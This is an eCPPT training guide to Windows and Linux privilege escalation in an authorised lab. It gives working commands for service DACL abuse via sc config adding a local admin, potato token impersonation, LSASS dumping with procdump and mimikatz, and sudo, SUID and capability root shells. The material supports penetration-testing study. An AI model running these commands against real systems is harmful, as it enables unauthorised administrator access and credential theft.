# Phase 03 — Privilege Escalation

> eCPPT · Methodology — INE-Cybersecurity-Certifications-Guide

## Purpose

Privilege escalation (privesc) turns a limited user into an administrator — on the local host first, then across the domain. In AD-heavy engagements the goal is usually local admin or SYSTEM on one machine to enable credential access and lateral movement (Phases 01–02). This guide is Windows-focused (matching typical eCPPT lab networks) with the key Linux techniques you still need when a rogue Linux box or jump host appears. Everything here assumes an authorized lab environment.

**Prerequisites:** practice these techniques on the hosts and accounts defined in [labs/ad-lab-setup.md](../labs/ad-lab-setup.md) (`corp.local`, `bob`/`mike`/`da.smith`, `SRV01`/`WS01`), then replay them as chains in [labs/attack-simulations.md](../labs/attack-simulations.md).

## Windows Privesc — Recon First

Automate the boring part, then verify manually — automation output is only a lead, not proof.

```powershell
# Who am I, and what can I do?
whoami /all          # groups + token privileges (SeImpersonate? SeDebug? SeBackup?)
systeminfo           # OS build -> patch level / known exploits (rarely needed)
# Service inventory with paths
wmic service get name,displayname,startmode,pathname | findstr /i "auto"
# PowerShell equivalent (cleaner output)
Get-CimInstance Win32_Service | Select Name,StartMode,PathName | Format-Table -AutoSize
```

Tools that bundle these checks: **winPEAS**, **Seatbelt**, **PowerUp**. Always confirm a finding by hand before exploiting it.

## Service Misconfigurations

### 1. Unquoted service paths

A service path with spaces and no quotes lets Windows interpret each token as a candidate executable.

```powershell
# Find candidates: path with spaces, no quotes
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v '"'
# If a service runs C:\Program Files\My App\svc.exe (unquoted, writable C:\),
# plant: C:\Program.exe  ->  restart the service to run your binary as SYSTEM
sc qc vulnsvc          # confirm the current binary path
icacls "C:\Program Files\My App"   # confirm you can write to a directory in the chain
```

### 2. Weak service binary or service DACL

The service itself may let any user change its configuration or binary.

```powershell
# Does an unprivileged user control the service object?
# (Use Sysinternals accesschk on the live box)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# Expected outcome: rows like RW vulnsvc -> SERVICE_CHANGE_CONFIG granted

# If so, repoint and restart (authorized lab):
sc config vulnsvc binPath= "cmd.exe /c net localgroup administrators <user> /add"
sc start vulnsvc
```

Common causes: third-party apps installed with `Everyone`/`Authenticated Users` write rights, or service binaries stored in world-writable folders.

### 3. AlwaysInstallElevated and scheduled tasks

```powershell
# AlwaysInstallElevated: MSI packages install as SYSTEM if BOTH keys are set to 1:
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Expected outcome: both return 0x1 -> build a malicious MSI (msfvenom) and install it
```

Also audit scheduled tasks you can create/modify (`schtasks /query /fo LIST /v`), startup folders, and DLL hijacking opportunities in the service search order (see MITRE T1574).

## Token Privileges — the Potato Family

Privileges live on your logon token. Two matter most for privesc:

- **SeImpersonatePrivilege** (default for service accounts) — impersonate a token you can get your hands on, ideally SYSTEM.
- **SeDebugPrivilege** — open and inject into arbitrary processes, including `lsass.exe` (credential access).

### How the "potato" attacks work

A potato tricks a privileged service into authenticating to a local **DCOM/RPC** endpoint over NTLM, then relays that authentication back to the same host to obtain a SYSTEM token you can impersonate. Variants differ in the trigger:

```text
JuicyPotato / RottenPotatoNG -> DCOM + BITS (patched on modern Windows, Server 2019+)
PrintSpoofer / Potato variants -> Print Spooler named pipe trick
GodPotato -> works across modern Windows versions using DCOM/OXID
```

```powershell
# Check the privilege first
whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"
# Expected outcome: SeImpersonatePrivilege      Enabled

# Typical exploitation (lab): drop PrintSpoofer/GodPotato, run a SYSTEM command
GodPotato.exe -cmd "cmd /c whoami"
# Expected outcome: nt authority\system
```

**SeDebugPrivilege** does not need a potato: with it you can open `lsass.exe` and read its memory (this is exactly what credential-dumping tools require).

```powershell
# With SeDebugPrivilege, dump LSASS for later offline parsing (authorized host)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# Parse locally: mimikatz "sekurlsa::minidump lsass.dmp" + "sekurlsa::logonpasswords"
```

Other valuable privileges: **SeBackupPrivilege/SeRestorePrivilege** (read the SAM/SYSTEM hive or any file regardless of ACL), **SeTakeOwnershipPrivilege**, **SeLoadDriverPrivilege** (load a vulnerable signed driver). `whoami /priv` is always your first command after landing.

## Key Linux Techniques (inside AD/network engagements)

Linux boxes in a Windows-heavy lab are usually jump hosts, web servers, or domain-joined via SSSD/realmd — same privesc rules apply.

```bash
# 1. sudo — check what the user may run
sudo -l
# Expected outcome: (ALL : ALL) ALL  -> trivial;  or a list like (root) NOPASSWD: /usr/bin/vim

# Abuse a whitelisted binary with GTFO bins semantics, e.g. vim as root:
sudo vim -c ':!whoami'        # expected outcome: root — or use the GTFOBins recipe for the binary

# 2. SUID binaries — anything setuid root you can influence?
find / -perm -4000 -type f 2>/dev/null
# Expected outcome: /usr/bin/sudo, /usr/bin/passwd... plus anything unusual (custom setuid tools)
# Classic: a SUID copy of python -> run python as the file owner (root)

# 3. Capabilities — file capabilities can replace SUID
getcap -r / 2>/dev/null
# Expected outcome: look for cap_setuid+ep on binaries you can run
# e.g. /usr/bin/python3 with cap_setuid -> python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Also re-check: world-writable scripts executed by cron/root, writable `PATH` directories used by root jobs, and NFS exports with `no_root_squash` (mount the share, place a setuid binary owned by root). Always run `sudo -l`, the SUID find, and `getcap` before spending time on kernel exploits — configuration bugs are far more common.

## Staying Legal and Clean

- These techniques belong in **your lab, training ranges, or scoped engagements** — never production or third-party systems.
- Don't skip verification: automation says "possible," your manual test says "pwned."
- Record each step (commands + output) — it becomes evidence and report content (Phase 05).
- Cleaning up (reverting service paths, deleting planted binaries) is part of professional testing.

## Common Mistakes & Tips

- **Blindly running winPEAS output:** a "Writable service path" row may be unwritable for *you*, or the directory chain may be protected — verify each finding with `icacls`/`accesschk`.
- **Skipping `whoami /priv`:** potato attacks are pointless without SeImpersonate/SeAssignPrimaryToken; check first.
- **Old potato advice:** JuicyPotato is largely dead on current builds; reach for PrintSpoofer/GodPotato-style tooling and test on the actual OS version.
- **Forgetting the machine account:** if you escalate on a domain-joined box as SYSTEM, you now hold the *computer account* — usable for enumeration and some attacks (e.g., if it has delegation rights).
- **Linux rabbit holes:** re-running kernel exploits instead of checking `sudo -l`, cron scripts, and capabilities first.
- **Ignoring the service restart problem:** modifying a service requires start/stop rights or a reboot — if you can't restart it, look for another vector.

## Checklist / Self-Test

- [ ] I enumerate services with `wmic`/`Get-CimInstance` and spot unquoted paths and weak DACLs.
- [ ] I can confirm a service-object DACL weakness with `accesschk` and exploit it via `sc config`.
- [ ] I check `AlwaysInstallElevated` and scheduled-task/startup persistence primitives.
- [ ] I interpret `whoami /priv` and know which privilege each potato family variant needs.
- [ ] I can exploit SeImpersonate with a modern potato and SeDebugPrivilege via LSASS dump.
- [ ] I can enumerate and abuse sudo rules, SUID binaries, and file capabilities on Linux.
- [ ] I verify every automated finding manually and record commands/output as evidence.

## Further Resources

- Microsoft Learn — Service accounts and Windows privileges (SeImpersonate/SeDebug): https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts
- MITRE ATT&CK — Privilege Escalation tactics (T1543 services, T1548, T1574): https://attack.mitre.org/
- GTFOBins — Unix binary abuse: https://gtfobins.github.io/
- HackTricks — Windows local privilege escalation: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- HackTricks — Linux privilege escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- Sysinternals AccessChk official page: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
